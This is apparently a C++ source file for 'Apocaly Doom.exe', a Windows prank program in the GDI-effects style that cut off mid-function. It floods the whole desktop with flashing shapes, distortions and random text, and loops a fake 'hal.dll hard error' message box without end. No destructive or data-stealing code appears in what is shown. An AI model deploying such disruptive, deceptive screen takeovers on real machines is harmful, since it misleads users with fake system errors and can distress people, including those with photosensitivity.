﻿#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <ctime>
#include <cmath>
#include "drawbytebeat.h"
#define PI 3.1415926535897932384626433832795028841971
#define sqrt8 2.8284271247461900976033774484194
#define sqrt2 1.414213562373095048801688724209
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define ApocalyDoomRGB (RGB(8, 144, 213))
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define DESKTOP_WINDOW ((HWND)0)
using namespace std;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD WINAPI fe(LPVOID lpParam) {
	while (true) 
	{
		MessageBox(NULL, L"hal.dll--unknown hard error:\r\n\ 0x00114514 specified the memory at 0x00114514. The requested data could not be placed in memory due to error 0x78917891.\r\n\r\n\To terminate the program, please click 'Yes'.\r\n\To test the program, please click 'No'.", L"Apocaly Doom.exe--Congratulations", MB_ICONERROR | MB_YESNO );
	}
	return 0;
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 5, 0 };
	while (true)
	{
		int w = rect.right - rect.left, h = rect.bottom - rect.top;
		HDC hdc = GetDC(hwndMsgBox), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int nindazhidazhidadazhi = 0; nindazhidazhidadazhi < 10; nindazhidazhidadazhi++) {
			HBRUSH hBrush = CreateSolidBrush(ApocalyDoomRGB);
			HPEN pen = CreatePen(PS_NULL, NULL, NULL);
			SelectObject(hcdc, hBrush);
			SelectObject(hcdc, pen);
			Rectangle(hcdc, 0, 0, w, h);
			DeleteObject(hBrush);
			DeleteObject(pen);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(250);
		}
		Sleep(250);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
VOID WINAPI train_function(HDC hdc, int w, int h, int xPower, int yPower, DWORD dwRop) {
	if (xPower >= w) xPower = w - 1; if (yPower >= h) yPower = h - 1;
	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, screenshot);
	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w - abs(xPower), h - abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, dwRop);
	BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, dwRop);
	BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, dwRop);
	DeleteDC(hdc2);
	DeleteObject(screenshot);
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}

DWORD WINAPI drawbytebeat1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((t >> 3 + 2 * t | t << 2 % (t + 1 | t)));
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI drawapocalydoomicon(LPVOID lpParam) {
	srand(time(NULL));
	int v1 = 1;
	int xLeft = 10;
	int v2 = 1;
	int yTop = 10;
	while (true)
	{
		HDC DC = GetDC(0);
		xLeft += 10 * v1;
		yTop += 10 * v2;
		HICON ico = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(107));
		DrawIconEx(DC, xLeft, yTop, ico, 5 * GetSystemMetrics(11), 5 * GetSystemMetrics(12), 0, 0, 3u);
		if (yTop >= GetSystemMetrics(1))
			v2 = -1;
		if (xLeft >= GetSystemMetrics(0))
			v1 = -1;
		if (!yTop)
			v2 = 1;
		if (!xLeft)
			v1 = 1;
		ReleaseDC(0, DC);
		Sleep(10);
	}
}
DWORD WINAPI gradientfillrect(LPVOID lpvd)
{
	HDC hdc;
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int rr[4] = { 0x5700, 0x6000,0x7300,0x4000 }, gg[4] = { 0x900,0x0,0x0c00,0x0 }, bb[4] = { 0xc100,0xc000,0xff00,0x8000 }, a = rand() % 4, b = rand() % 4;
		TRIVERTEX vtx[2];
		vtx[0].x = w - (rand() % w); vtx[0].y = h - (rand() % h);
		vtx[1].x = rand() % w; vtx[1].y = rand() % h;
		vtx[0].Red = rr[a]; vtx[0].Green = gg[a]; vtx[0].Blue = bb[a]; vtx[0].Alpha = 0xff00;
		vtx[1].Red = rr[b]; vtx[1].Green = gg[b]; vtx[1].Blue = bb[b]; vtx[1].Alpha = 0xff00;
		GRADIENT_RECT rc;
		rc.UpperLeft = 0; rc.LowerRight = 1;
		DWORD mode[4] = { GRADIENT_FILL_RECT_H,GRADIENT_FILL_RECT_V,GRADIENT_FILL_TRIANGLE, GRADIENT_FILL_OP_FLAG };
		GradientFill(hdc, vtx, 4, &rc, 1, mode[rand() % 4]);
		ReleaseDC(0, hdc);
		Sleep(2.5);
	}
	return 0;
}
DWORD WINAPI sth(LPVOID lpParam) {
	HDC hdc = GetWindowDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		POINT point[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
		BYTE bytecopy[3] = { PT_MOVETO ,PT_LINETO ,PT_BEZIERTO };
		INT intcopy[7] = { 2,3,4,5,6,7,8 };
		BOOL Function[10] = {
			Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h) ,
			Chord(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
			Ellipse(hdc,rand() % w,rand() % h,rand() % w,rand() % h) ,
			Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
			PolyBezierTo(hdc,point,rand() % 8),
			PolyDraw(hdc,point,bytecopy,rand() % 8),
			Polygon(hdc,point,rand() % 8),
			PolyPolygon(hdc,point,intcopy,rand() % 8),
			Rectangle(hdc,rand() % w,rand() % h,rand() % w,rand() % h),
			RoundRect(hdc,rand() % w,rand() % h,rand() % w,rand() % h,rand() % w,rand() % h),
		};
		SelectObject(hdc, CreatePen(PS_SOLID, rand() % 10, RndRGB));
		SelectObject(hdc, CreateSolidBrush(RndRGB));
		Function[rand() % 10];
		DeleteObject;
	}
	return 0;
}
DWORD WINAPI rect(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(NULL);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBRUSH brush = CreateSolidBrush(RGB(255, 255, 255));
		HPEN pen = CreatePen(PS_SOLID, 1 + rand() % 16, RndRGB);
		SelectObject(hdc, brush);
		SelectObject(hdc, pen);
		Rectangle(hdc, rand() % w, rand() % h, w - rand() % w, h - rand() % h);
		DeleteObject(brush);
		DeleteObject(pen);
		ReleaseDC(0, hdc);
		Sleep(2.5);
	}
}
DWORD WINAPI rect1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(NULL);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBRUSH brush = CreateSolidBrush(ApocalyDoomRGB);
		HPEN pen = CreatePen(PS_SOLID, 1 + rand() % 16, RndRGB);
		SelectObject(hdc, brush);
		SelectObject(hdc, pen);
		Rectangle(hdc, rand() % w, rand() % h, w - rand() % w, h - rand() % h);
		DeleteObject(brush);
		DeleteObject(pen);
		ReleaseDC(0, hdc);
		Sleep(25);
	}
}
DWORD WINAPI flower1(LPVOID lpParam) {
	srand(time(NULL));
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		int a = rand() % 200;
		int x = rand() % w;
		int y = rand() % h;
		HPEN hPen = CreatePen(PS_SOLID, a / 10, RndRGB);
		SelectObject(hdc, hPen);
		Arc(hdc, x - (a * (2 + sqrt8)), y - (a * (2 + sqrt8)), x + (a * (sqrt8 - 2)), y + (a * (sqrt8 - 2)), x - (a * 4), y, x, y);
		Arc(hdc, x - (a * 2 * sqrt8), y - (a * sqrt8), x, y + (a * sqrt8), x, y, x - (a * sqrt8), y - (a * sqrt8));
		Arc(hdc, x - (a * 2 * sqrt8), y - (a * sqrt8), x, y + (a * sqrt8), x - (a * sqrt8), y + (a * sqrt8), x, y);
		Arc(hdc, x - (a * (2 + sqrt8)), y - (a * (2 + sqrt8)), x + (a * (sqrt8 - 2)), y + (a * (sqrt8 - 2)), x, y, x, y - (a * 4));
		Arc(hdc, x - (a * (2 + sqrt8)), y - (a * (sqrt8 - 2)), x + (a * (sqrt8 - 2)), y + (a * (2 + sqrt8)), x, y + (a * 4), x, y);
		Arc(hdc, x - (a * sqrt8), y - (a * 2 * sqrt8), x + (a * sqrt8), y, x, y, x + (a * sqrt8), y - (a * sqrt8));
		Arc(hdc, x - (a * sqrt8), y, x + (a * sqrt8), y + (a * 2 * sqrt8), x + (a * sqrt8), y + (a * sqrt8), x, y);
		Arc(hdc, x - (a * (sqrt8 - 2)), y - (a * (2 + sqrt8)), x + (a * (2 + sqrt8)), y + (a * (sqrt8 - 2)), x, y, x + (a * 4), y);
		Arc(hdc, x - (a * (sqrt8 - 2)), y - (a * (sqrt8 - 2)), x + (a * (2 + sqrt8)), y + (a * (2 + sqrt8)), x + (a * 4), y, x, y);
		Arc(hdc, x, y - (a * sqrt8), x + (a * (2 + sqrt8)), y + (a * sqrt8), x, y, x + (a * sqrt8), y + (a * sqrt8));
		Arc(hdc, x, y - (a * sqrt8), x + (a * (2 + sqrt8)), y + (a * sqrt8), x + (a * sqrt8), y - (a * sqrt8), x, y);
		Arc(hdc, x - (a * (sqrt8 - 2)), y - (a * (sqrt8 - 2)), x + (a * (2 + sqrt8)), y + (a * (2 + sqrt8)), x, y, x, y + (a * 4));
		Arc(hdc, x - (a * (sqrt8 - 2)), y - (a * (2 + sqrt8)), x + (a * (2 + sqrt8)), y + (a * (sqrt8 - 2)), x, y - (a * 4), x, y);
		Arc(hdc, x - (a * sqrt8), y, x + (a * sqrt8), y + (a * 2 * sqrt8), x, y, x - (a + sqrt8), y + (a * sqrt8));
		Arc(hdc, x - (a * sqrt8), y - (a * 2 * sqrt8), x + (a * sqrt8), y, x - (a * sqrt8), y - (a * sqrt8), x, y);
		Arc(hdc, x - (a * (2 + sqrt8)), y - (a * (sqrt8 - 2)), x + (a * (sqrt8 - 2)), y + (a * (2 + sqrt8)), x, y, x - (a * 4), y);
		Sleep(100);
		DeleteObject(hPen);
	}
}
DWORD WINAPI flower2(LPVOID lpParam) {
	srand(time(NULL));
	while (true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		int s = (w + h) / 15 * 2;
		int a = s - (rand() % s);
		int x = w - (rand() % w);
		int y = h - (rand() % h);
		HPEN hPen = CreatePen(PS_SOLID, a / 16, RndRGB);
		SelectObject(hdc, hPen);
		Arc(hdc, x - a * sqrt2, y - a * (2 * sqrt2), x + a * sqrt2, y, x - a, y + a * (1 - sqrt2), x + a, y + a * (1 - sqrt2));
		Arc(hdc, x + a * (1 - sqrt2), y - a * (1 + sqrt2), x + a * (1 + sqrt2), y + a * (sqrt2 - 1), x - a * sqrt2, y - a, x + a, y + a * sqrt2);
		Arc(hdc, x, y - a * sqrt2, x + a * (2 * sqrt2), y + a * sqrt2, x + a * (sqrt2 - 1), y - a, x + a * (sqrt2 - 1), y + a);
		Arc(hdc, x + a * (1 - sqrt2), y + a * (1 - sqrt2), x + a * (sqrt2 + 1), y + a * (sqrt2 + 1), x + a, y + a * (1 - sqrt2), x + a * (1 - sqrt2), y + a);
		Arc(hdc, x - a * sqrt2, y, x + a * sqrt2, y + a * (sqrt2 + 1), x + a, y + a * (sqrt2 - 1), x - a, y + a * (sqrt2 - 1));
		Arc(hdc, x - a * (1 + sqrt2), y + a * (1 - sqrt2), x + a * (sqrt2 - 1), y + a * (1 + sqrt2), x + a * (sqrt2 - 1), y + a, x - a, y + a * (1 - sqrt2));
		Arc(hdc, x - a * (2 * sqrt2), y - a * sqrt2, x, y + a * sqrt2, x + a * (1 - sqrt2), y + a, x + a * (1 - sqrt2), y - a);
		Arc(hdc, x - a * (1 + sqrt2), y - a * (1 + sqrt2), x + a * (sqrt2 - 1), y + a * (sqrt2 - 1), x - a, y + a * (sqrt2 - 1), x + a * (sqrt2 - 1), y - a);
		DeleteObject(hPen);
		Sleep(100);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI flower3(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		int s = (w + h) / 15 * 2;
		int a = rand() % s;
		int x = rand() % w;
		int y = rand() % h;
		HPEN hPen = CreatePen(PS_SOLID, a / 16, RndRGB);
		HPEN hPen1 = CreatePen(PS_SOLID, a / 16, RndRGB);
		HPEN hPen2 = CreatePen(PS_SOLID, a / 16, RndRGB);
		HPEN hPen3 = CreatePen(PS_SOLID, a / 16, RndRGB);
		HPEN hPen4 = CreatePen(PS_SOLID, a / 16, RndRGB);
		HPEN hPen5 = CreatePen(PS_SOLID, a / 16, RndRGB);
		HPEN hPen6 = CreatePen(PS_SOLID, a / 16, RndRGB);
		HPEN hPen7 = CreatePen(PS_SOLID, a / 16, RndRGB);
		HPEN hPen8 = CreatePen(PS_SOLID, a / 16, RndRGB);
		SelectObject(hdc, hPen1);
		Arc(hdc, x - a * sqrt2, y - a * (2 * sqrt2), x + a * sqrt2, y, x - a, y + a * (1 - sqrt2), x + a, y + a * (1 - sqrt2));
		DeleteObject(hPen1);
		SelectObject(hdc, hPen2);
		Arc(hdc, x + a * (1 - sqrt2), y - a * (1 + sqrt2), x + a * (1 + sqrt2), y + a * (sqrt2 - 1), x - a * sqrt2, y - a, x + a, y + a * sqrt2);
		DeleteObject(hPen2);
		SelectObject(hdc, hPen3);
		Arc(hdc, x, y - a * sqrt2, x + a * (2 * sqrt2), y + a * sqrt2, x + a * (sqrt2 - 1), y - a, x + a * (sqrt2 - 1), y + a);
		DeleteObject(hPen3);
		SelectObject(hdc, hPen4);
		Arc(hdc, x + a * (1 - sqrt2), y + a * (1 - sqrt2), x + a * (sqrt2 + 1), y + a * (sqrt2 + 1), x + a, y + a * (1 - sqrt2), x + a * (1 - sqrt2), y + a);
		DeleteObject(hPen4);
		SelectObject(hdc, hPen5);
		Arc(hdc, x - a * sqrt2, y, x + a * sqrt2, y + a * (sqrt2 + 1), x + a, y + a * (sqrt2 - 1), x - a, y + a * (sqrt2 - 1));
		DeleteObject(hPen5);
		SelectObject(hdc, hPen6);
		Arc(hdc, x - a * (1 + sqrt2), y + a * (1 - sqrt2), x + a * (sqrt2 - 1), y + a * (1 + sqrt2), x + a * (sqrt2 - 1), y + a, x - a, y + a * (1 - sqrt2));
		DeleteObject(hPen6);
		SelectObject(hdc, hPen7);
		Arc(hdc, x - a * (2 * sqrt2), y - a * sqrt2, x, y + a * sqrt2, x + a * (1 - sqrt2), y + a, x + a * (1 - sqrt2), y - a);
		DeleteObject(hPen7);
		SelectObject(hdc, hPen8);
		Arc(hdc, x - a * (1 + sqrt2), y - a * (1 + sqrt2), x + a * (sqrt2 - 1), y + a * (sqrt2 - 1), x - a, y + a * (sqrt2 - 1), x + a * (sqrt2 - 1), y - a);
		DeleteObject(hPen8);
		Sleep(100);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI flower4(LPVOID lpParam) {
	srand(time(NULL));
	int status = 3;
	POINT p;
	p.x = 0, p.y = 0;
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int a = (w + h) / 60;
		for (int b = 0; b < 8; b++) {
			int x1[8] = { p.x - (a * (2 + sqrt8)) ,p.x - (a * 2 * sqrt8) ,p.x - (a * (2 + sqrt8)) ,p.x - (a * sqrt8) , p.x - (a * (sqrt8 - 2)) ,p.x, p.x - (a * (sqrt8 - 2)) ,p.x - (a * sqrt8) };
			int y1[8] = { p.y - (a * (2 + sqrt8)) ,p.y - (a * sqrt8) ,p.y - (a * (sqrt8 - 2)),p.y, p.y - (a * (sqrt8 - 2)), p.y - (a * sqrt8),p.y - (a * (2 + sqrt8)),p.y - (a * 2 * sqrt8) };
			int x2[8] = { p.x + (a * (sqrt8 - 2)),p.x, p.x + (a * (sqrt8 - 2)),p.x + (a * sqrt8),  p.x + (a * (2 + sqrt8)),p.x + (a * (2 + sqrt8)),p.x + (a * (2 + sqrt8)), p.x + (a * sqrt8) };
			int y2[8] = { p.y + (a * (sqrt8 - 2)),p.y + (a * sqrt8), p.y + (a * (2 + sqrt8)), p.y + (a * 2 * sqrt8),  p.y + (a * (2 + sqrt8)),p.y + (a * sqrt8),p.y + (a * (sqrt8 - 2)), p.y };
			int x3[8] = { p.x - (a * 4),p.x - (a * sqrt8), p.x, p.x + (a * sqrt8), p.x + (a * 4),p.x + (a * sqrt8),  p.x,  p.x - (a * sqrt8) };
			int y3[8] = { p.y,p.y + (a * sqrt8),p.y + (a * 4), p.y + (a * sqrt8),  p.y,  p.y - (a * sqrt8),p.y - (a * 4), p.y - (a * sqrt8) };
			SelectObject(hdc, CreatePen(PS_INSIDEFRAME, a / 5, RndRGB));
			Arc(hdc, x1[b], y1[b], x2[b], y2[b], x3[b], y3[b], p.x, p.y);
			DeleteObject;
			switch (status) {
			case 0:
				p.x -= 16 * wdpi / 96;
				p.y -= 16 * hdpi / 96;
				if (p.x < 0 || p.y < 0) {
					if (p.x < 0) {
						status = 1;
					}
					if (p.y < 0) {
						status = 2;
					}
				}
				break;
			case 1:
				p.x += 16 * wdpi / 96;
				p.y -= 16 * hdpi / 96;
				if (p.x >= w || p.y < 0) {
					if (p.x >= w) {
						status = 0;
					}
					if (p.y < 0) {
						status = 3;
					}
				}
				break;
			case 2:
				p.x -= 16 * wdpi / 96;
				p.y += 16 * hdpi / 96;
				if (p.x < 0 || p.y >= h) {
					if (p.x < 0) {
						status = 3;
					}
					if (p.y >= h) {
						status = 0;
					}
				}
				break;
			case 3:
				if (p.x >= w && p.y >= h) {
					RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
					return 0;
				}
				p.x += 16 * wdpi / 96;
				p.y += 16 * hdpi / 96;
				if (p.x >= w || p.y >= h) {
					if (p.x >= w) {
						status = 2;
					}
					if (p.y >= h) {
						status = 1;
					}
				}
				break;
			}
			Sleep(40);
		}
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI texts(LPVOID lpvd)
{
	HDC hdc;
	HFONT hfnt;
	int sw, sh;
	while (true)
	{
		hdc = GetDC(0);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		hfnt = CreateFont(rand() % 50, rand() % 50, 0, 0, FW_EXTRABOLD, true, false, false, ANSI_CHARSET, 0, 0, 0, 0, L"棍木");
		LPCSTR lpSystemStrings[9] = { "Apocaly Doom.exe", "LambdaTechnology Studio", "Seed.1040", "I don't want to wait for death, even though everything is silent", "Why has everything stopped?", "My body and mind have been ravaged by this", "Make the extremely cold stop, please......", "Cryo-Cannon doesn't welcome you", "LanPiaoPiaoFlyNB" };
		int SystemStringCount = rand() % 9;
		SelectObject(hdc, hfnt);
		SetTextColor(hdc, RndRGB);
		SetBkMode(hdc, 0);
		TextOutA(hdc, rand() % sw, rand() % sh, lpSystemStrings[SystemStringCount], strlen(lpSystemStrings[SystemStringCount]));
		DeleteObject(hfnt);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}
DWORD WINAPI tanwave1(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (true)
	{
		HDC hdc = GetDC(0);
		for (int i = 0; i < sw * 2; i++) {
			int wave = tan(i / ((float)xSize) * PI) * (ySize);
			BitBlt(hdc, 0, i, sw, 1, hdc, wave, i, NOTSRCCOPY);
		}
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI train(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		for (int angle = 0; angle < 720; angle++) {
			int x = (-100) * cos(angle * PI / 180.F), y = (-100) * sin(angle * PI / 180.F);
			hdc = GetDC(0);
			train_function(hdc, w, h, x, y, SRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(1);
		}
	}
}
DWORD WINAPI fastmoving(LPVOID lpParam) {
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
